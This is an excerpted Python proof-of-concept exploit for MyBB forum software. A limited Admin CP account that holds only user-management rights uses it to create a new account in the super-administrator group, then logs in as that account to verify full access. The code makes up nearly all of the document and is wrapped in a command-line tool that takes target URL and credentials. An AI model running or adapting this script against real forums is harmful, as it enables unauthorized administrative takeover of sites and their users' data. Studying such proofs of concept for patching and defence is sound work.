...
# A nonsuper Admin CP account with only the user management module permission can create a new user in the SA group (gid=4)
...
class MyBBClient:
    ...
    def login_acp(self, username: str, password: str) -> str:
        resp = self.request(
            self.admin_url(),
            {"do": "login", "username": username, "password": password},
        )
        adminsid = self.cookie_value("adminsid")
        if not adminsid:
            raise PocError(f"ACP login failed or no adminsid; HTTP {resp.status}")
        return adminsid
...
def main(argv: list[str]) -> int:
    parser = argparse.ArgumentParser(description="Create full MyBB Administrator from limited ACP account")
    parser.add_argument("--url", required=True, help="Base forum URL")
    parser.add_argument("--admin-path", default="admin", help="Admin CP path")
    parser.add_argument("--admin-user", help="Limited ACP username")
    parser.add_argument("--admin-pass", help="Limited ACP password")
    parser.add_argument("--adminsid", help="Existing adminsid cookie")
    parser.add_argument("--new-user", required=True, help="New admin username")
    parser.add_argument("--new-pass", required=True, help="New admin password")
    parser.add_argument("--new-email", required=True, help="New admin email")
    parser.add_argument("--probe-module", default="config-settings", help="Probe module")
    ...
    if not args.adminsid and not (args.admin_user and args.admin_pass):
        parser.error("provide --adminsid or both --admin-user and --admin-pass")
    ...
    probe = source.request(source.admin_url(f"module={urllib.parse.quote(args.probe_module)}"))
    source_denied = has_access_denied(probe.body)
    ...
    new_client = MyBBClient(args.url, args.admin_path, verify_tls=not args.no_verify_tls)
    new_client.login_acp(args.new_user, args.new_pass)
    new_probe = new_client.request(new_client.admin_url(f"module={urllib.parse.quote(args.probe_module)}"))
    new_denied = has_access_denied(new_probe.body)

    print_kv([
        ("target", args.url.rstrip("/")),
        ("source_probe", f"HTTP {probe.status}"),
        ("source_denied", "yes" if source_denied else "no"),
        ("add_form", f"HTTP {add_form.status}"),
        ("post_key", "found"),
        ("create", f"HTTP {create.status}"),
        ("new_login", "success" if new_client.cookie_value("adminsid") else "failed"),
        ("new_probe", f"HTTP {new_probe.status}"),
        ("new_denied", "yes" if new_denied else "no"),
    ])

    if create.status not in (200, 302) or new_denied or not new_client.cookie_value("adminsid"):
        raise PocError("Exploit failed verification")

    print("\nResult: full Administrator account created")
    return 0
